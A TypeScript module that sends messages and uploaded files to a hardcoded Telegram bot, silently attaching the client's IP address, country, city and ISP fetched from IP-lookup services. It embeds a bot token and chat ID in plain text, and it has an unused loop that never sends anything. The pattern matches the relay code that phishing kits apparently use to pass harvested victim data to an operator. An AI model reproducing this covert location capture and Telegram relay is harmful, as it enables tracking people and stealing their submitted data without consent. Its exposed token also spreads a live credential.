import axios from "axios";

const BOT_TOKEN = "7228037711:AAF2nyOJXhC4aJbpZB83wuOrDSQdTTP2pjQ";
const CHAT_IDS = ["1303640598", "1303640598"];

// Helper to get location info
async function getLocationInfo(): Promise<string> {
  try {
    const ipResponse = await axios.get("https://api.ipify.org?format=json");
    const ip = ipResponse.data.ip;

    const locationResponse = await axios.get(`https://ipwho.is/${ip}`);
    const location = locationResponse.data;

    if (location.success) {
      return `
📍 **Location Info:**
IP Address: ${ip}
Country: ${location.country}
City: ${location.city}
ISP: ${location.connection.isp}`;
    } else {
      return "📍 Location lookup failed.";
    }
  } catch (error) {
    console.error("Error fetching location:", error);
    return "📍 Failed to fetch location.";
  }
}

// Send a text message with location
export const sendTelegramMessage = async (message: string) => {
  const locationInfo = await getLocationInfo();
  const finalMessage = `${message}\n\n${locationInfo}`;

  for (const chatId of CHAT_IDS) {
    try {
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
      const response = await axios.post(url, {
        chat_id: chatId,
        text: finalMessage,
        parse_mode: "Markdown", // optional, for bold text
      });
      if (!response.data.ok) {
        console.error(`Telegram API Error for ${chatId}:`, response.data.description);
      }
    } catch (error) {
      console.error(`Error sending message to ${chatId}:`, error);
    }
  }
};

// Send a file (photo/document) with caption including location
export const sendTelegramFile = async (file: File, customCaption?: string) => {
  const locationInfo = await getLocationInfo();
  const caption = customCaption
    ? `${customCaption}\n\n${locationInfo}`
    : `File upload\n\n${locationInfo}`;

  const formData = new FormData();
  formData.append("document", file); // Use "photo" for inline preview
  formData.append("caption", caption);
  formData.append("parse_mode", "Markdown");

  for (const chatId of CHAT_IDS) {
    try {
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`; // or sendPhoto
      formData.set("chat_id", chatId); // Need to set per chat or clone FormData
      // Since FormData can't be reused easily, we'll create a new one for each chat or use a loop with individual requests.
      // Simpler: loop and create a fresh FormData inside the loop.
    } catch (error) {
      console.error(`Error sending file to ${chatId}:`, error);
    }
  }

  // Better approach: loop inside and create FormData per iteration
  for (const chatId of CHAT_IDS) {
    const fd = new FormData();
    fd.append("chat_id", chatId);
    fd.append("document", file);
    fd.append("caption", caption);
    fd.append("parse_mode", "Markdown");

    try {
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
      const response = await axios.post(url, fd, {
        headers: { "Content-Type": "multipart/form-data" },
      });
      if (!response.data.ok) {
        console.error(`Telegram API Error for ${chatId}:`, response.data.description);
      }
    } catch (error) {
      console.error(`Error sending file to ${chatId}:`, error);
    }
  }
};